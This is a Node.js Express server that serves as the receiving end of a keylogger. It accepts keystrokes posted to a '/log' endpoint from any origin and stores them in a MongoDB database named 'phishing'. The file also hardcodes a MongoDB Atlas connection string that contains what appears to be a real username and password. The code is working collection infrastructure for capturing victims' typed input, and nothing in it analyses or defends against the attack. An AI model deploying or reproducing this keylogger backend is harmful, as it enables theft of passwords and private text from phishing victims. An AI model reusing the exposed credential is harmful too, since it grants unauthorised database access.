const express = require('express');  
const bodyParser = require('body-parser');  
const mongoose = require('mongoose');  

const app = express();  
const PORT = process.env.PORT || 3000;  

// Connect to MongoDB Atlas  
const mongoUri = 'mongodb+srv://zamprognomicheal22:hRF8UQvfSDxf0xJc@mycluster.6cxeu.mongodb.net/phishing?retryWrites=true&w=majority&appName=MyCluster';  
mongoose.connect(mongoUri, { useNewUrlParser: true, useUnifiedTopology: true })  
  .then(() => {  
    console.log('Connected to MongoDB');  
    // Debug log to verify database and collection  
    mongoose.connection.db.listCollections().toArray((err, collections) => {  
      if (err) {  
        console.error('Failed to list collections:', err);  
      } else {  
        console.log('Collections:', collections);  
      }  
    });  
  })  
  .catch(err => console.error('Failed to connect to MongoDB:', err));  

// Define a schema for keystrokes  
const keystrokeSchema = new mongoose.Schema({  
  key: String,  
  timestamp: { type: Date, default: Date.now }  
});  

const Keystroke = mongoose.model('Keystroke', keystrokeSchema);  

// Middleware  
app.use(bodyParser.json());  
app.use(bodyParser.urlencoded({ extended: true }));  

// Enable CORS  
app.use((req, res, next) => {  
  res.header('Access-Control-Allow-Origin', '*');  
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');  
  next();  
});  

// Endpoint to handle keystroke data  
app.post('/log', (req, res) => {  
  const { key } = req.body;  
  console.log('Received keystroke:', key); // Debug log  

  const keystroke = new Keystroke({ key });  
  keystroke.save()  
    .then(() => {  
      console.log(`Keystroke saved: ${key}`); // Debug log  
      res.status(200).send('Keystroke saved');  
    })  
    .catch(err => {  
      console.error('Failed to save keystroke:', err); // Debug log  
      res.status(500).send('Failed to save keystroke');  
    });  
});  

// Start the server  
app.listen(PORT, () => {  
  console.log(`Server is running on http://localhost:${PORT}`);  
});  